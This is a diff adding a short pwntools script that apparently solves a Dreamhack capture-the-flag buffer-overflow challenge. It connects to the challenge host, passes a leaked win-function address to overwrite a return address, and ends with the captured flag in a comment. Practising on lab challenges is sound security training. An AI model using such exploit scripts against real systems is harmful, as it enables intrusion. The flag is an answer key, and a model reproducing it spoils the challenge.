@@ -1,0 +1,14 @@
+from pwn import *
+
+# BOF overwite the return address with win func address
+
+p = remote("host3.dreamhack.games", 8474)
+#p = process("./deploy/baby-bof")
+
+p.recvuntil("(")
+s = p.recvuntil(")").decode()[:-1]
+p.sendline("vani5hing")
+p.sendline(s)
+p.sendline(str(4))
+p.interactive()
+#DH{62228e6f20a8b71372f0eceb51537c7f94b8191651ea0636ed4e48857c5b340c}
